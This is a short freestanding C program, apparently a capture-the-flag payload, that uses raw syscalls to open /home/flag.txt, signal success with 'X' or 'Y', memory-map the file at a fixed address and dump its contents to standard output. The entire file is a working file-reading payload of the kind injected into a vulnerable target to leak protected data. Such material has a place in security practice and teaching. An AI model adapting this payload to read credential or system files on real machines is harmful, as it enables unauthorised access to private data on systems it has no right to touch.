#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>

#define STDOUT_FD (1)

long syscall_func(long number, ...);

__attribute__((section(".text"))) const char flag_path[] = "/home/flag.txt";
__attribute__((section(".text"))) const char x_str[] = "X";
__attribute__((section(".text"))) const char y_str[] = "Y";

void _start(void)
{
    int flag_fd = -1;
    uint8_t bytes[16];

    // Open flag path, report error to stdout
    flag_fd = syscall_func(__NR_open, flag_path, O_RDWR, 0);
    if (flag_fd < 0)
    {
        syscall_func(__NR_write, STDOUT_FD, x_str, 1);
    }
    else
    {
        syscall_func(__NR_write, STDOUT_FD, y_str, 1);
    }

    // Read from flag file and print to stdout
    char * cron_page = (char *) 0x100000;
    syscall_func(__NR_mmap, cron_page, 0x1000, PROT_READ, MAP_PRIVATE | MAP_FIXED, flag_fd, 0);
    syscall_func(__NR_write, STDOUT_FD, cron_page, 0x1000);
    
    // Cleanup and exit
    syscall_func(__NR_close, flag_fd);
    syscall_func(__NR_exit_group, 1);
}
